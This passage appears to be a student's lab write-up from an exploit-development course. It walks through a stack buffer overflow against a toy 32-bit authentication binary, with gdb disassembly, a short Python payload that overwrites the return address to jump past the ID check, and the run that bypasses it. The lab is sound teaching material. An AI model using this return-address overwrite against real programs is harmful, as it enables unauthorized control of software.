   0x08048514 <+61>:	push   0x804865c
   0x08048519 <+66>:	call   0x8048330 <puts@plt>
   0x0804851e <+71>:	add    esp,0x10
   0x08048521 <+74>:	sub    esp,0xc
   0x08048524 <+77>:	push   0x804867f
   0x08048529 <+82>:	call   0x8048330 <puts@plt>
   0x0804852e <+87>:	add    esp,0x10
   0x08048531 <+90>:	jmp    0x8048543 <main+108>
   0x08048533 <+92>:	sub    esp,0xc
   0x08048536 <+95>:	push   0x804869c
   0x0804853b <+100>:	call   0x8048330 <puts@plt>
   0x08048540 <+105>:	add    esp,0x10
   0x08048543 <+108>:	mov    ecx,DWORD PTR [ebp-0x4]
   0x08048546 <+111>:	leave
   0x08048547 <+112>:	lea    esp,[ecx-0x4]
   0x0804854a <+115>:	ret
End of assembler dump.
(gdb) x/s 0x804869c
0x804869c:	"ID Accepted!  The answer is 42!"
(gdb) quit
u32@u32-VirtualBox:~/cnit127/chapter-2/Proj-2x$
```

```
   0x08048533 <+92>:	sub    esp,0xc
   0x08048536 <+95>:	push   0x804869c
   0x0804853b <+100>:	call   0x8048330 <puts@plt>
```

```sh
u32@u32-VirtualBox:~/cnit127/chapter-2/Proj-2x$ cat p2xb-e.py
#!/usr/bin/python

import sys
sys.stdout.write("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x33\x85\x04\x08")
u32@u32-VirtualBox:~/cnit127/chapter-2/Proj-2x$
```

```sh
u32@u32-VirtualBox:~/cnit127/chapter-2/Proj-2x$ chmod +x p2xb-e.py
```

```sh
u32@u32-VirtualBox:~/cnit127/chapter-2/Proj-2x$ ./p2xb-e.py > p2xb-exploit
```

```sh
u32@u32-VirtualBox:~/cnit127/chapter-2/Proj-2x$ xxd -g 1 p2xb-exploit
00000000: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
00000010: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
00000020: 41 41 41 41 41 41 33 85 04 08                    AAAAAA3...
u32@u32-VirtualBox:~/cnit127/chapter-2/Proj-2x$
```

```sh
u32@u32-VirtualBox:~/cnit127/chapter-2/Proj-2x$ gdb ./p2xb -q
Reading symbols from ./p2xb...(no debugging symbols found)...done.
(gdb) disassemble auth
Dump of assembler code for function auth:
   0x0804845b <+0>:	push   ebp
   0x0804845c <+1>:	mov    ebp,esp
   0x0804845e <+3>:	sub    esp,0x28
   0x08048461 <+6>:	mov    DWORD PTR [ebp-0xc],0xf
   0x08048468 <+13>:	sub    esp,0xc
   0x0804846b <+16>:	push   0x80485e0
   0x08048470 <+21>:	call   0x8048310 <printf@plt>
   0x08048475 <+26>:	add    esp,0x10
   0x08048478 <+29>:	sub    esp,0xc
   0x0804847b <+32>:	lea    eax,[ebp-0x22]
   0x0804847e <+35>:	push   eax
   0x0804847f <+36>:	call   0x8048320 <gets@plt>
   0x08048484 <+41>:	add    esp,0x10
   0x08048487 <+44>:	mov    DWORD PTR [ebp-0x10],0x0
   0x0804848e <+51>:	jmp    0x80484ba <auth+95>
   0x08048490 <+53>:	lea    edx,[ebp-0x22]
   0x08048493 <+56>:	mov    eax,DWORD PTR [ebp-0x10]
   0x08048496 <+59>:	add    eax,edx
   0x08048498 <+61>:	movzx  eax,BYTE PTR [eax]
   0x0804849b <+64>:	movsx  eax,al
   0x0804849e <+67>:	and    eax,DWORD PTR [ebp-0xc]
   0x080484a1 <+70>:	mov    edx,eax
   0x080484a3 <+72>:	mov    eax,DWORD PTR [ebp-0x10]
   0x080484a6 <+75>:	add    eax,0x1
   0x080484a9 <+78>:	movzx  eax,BYTE PTR [ebp+eax*1-0x22]
   0x080484ae <+83>:	movsx  eax,al
   0x080484b1 <+86>:	or     eax,edx
   0x080484b3 <+88>:	mov    DWORD PTR [ebp-0xc],eax
   0x080484b6 <+91>:	add    DWORD PTR [ebp-0x10],0x2
   0x080484ba <+95>:	cmp    DWORD PTR [ebp-0x10],0x7
   0x080484be <+99>:	jle    0x8048490 <auth+53>
   0x080484c0 <+101>:	cmp    DWORD PTR [ebp-0xc],0x3e7
   0x080484c7 <+108>:	jne    0x80484d0 <auth+117>
   0x080484c9 <+110>:	mov    eax,0x0
   0x080484ce <+115>:	jmp    0x80484d5 <auth+122>
   0x080484d0 <+117>:	mov    eax,0x1
   0x080484d5 <+122>:	leave
   0x080484d6 <+123>:	ret
End of assembler dump.
(gdb) break *0x0804847f
Breakpoint 1 at 0x804847f
(gdb) break *0x080484d5
Breakpoint 2 at 0x80484d5
(gdb) run --args < p2xb-exploit
Starting program: /home/u32/cnit127/chapter-2/Proj-2x/p2xb --args < p2xb-exploit
Only CISSPs are authorized to use this dangerous exploit.

Breakpoint 1, 0x0804847f in auth ()
(gdb) x/20x $ebp
0xbffff598:	0xbffff5a8	0x080484fd	0xb7fb83dc	0xbffff5c0
0xbffff5a8:	0x00000000	0xb7e1a276	0x00000002	0xb7fb8000
0xbffff5b8:	0x00000000	0xb7e1a276	0x00000002	0xbffff654
0xbffff5c8:	0xbffff660	0x00000000	0x00000000	0x00000000
0xbffff5d8:	0xb7fb8000	0xb7fffc04	0xb7fff000	0x00000000
(gdb) c
Continuing.

Breakpoint 2, 0x080484d5 in auth ()
(gdb) x/20x $ebp
0xbffff598:	0x41414141	0x08048533	0xb7fb8300	0xbffff5c0
0xbffff5a8:	0x00000000	0xb7e1a276	0x00000002	0xb7fb8000
0xbffff5b8:	0x00000000	0xb7e1a276	0x00000002	0xbffff654
0xbffff5c8:	0xbffff660	0x00000000	0x00000000	0x00000000
0xbffff5d8:	0xb7fb8000	0xb7fffc04	0xb7fff000	0x00000000
(gdb) c
Continuing.
Enter your (ISC)^2 CISSP ID Number: ID Accepted!  The answer is 42!

Program received signal SIGSEGV, Segmentation fault.
0x08048543 in main ()
(gdb)
```

```sh
u32@u32-VirtualBox:~/cnit127/chapter-2/Proj-2x$ ./p2xb < p2xb-exploit
Only CISSPs are authorized to use this dangerous exploit.
Enter your (ISC)^2 CISSP ID Number: ID Accepted!  The answer is 42!
Segmentation fault (core dumped)
u32@u32-VirtualBox:~/cnit127/chapter-2/Proj-2x$
```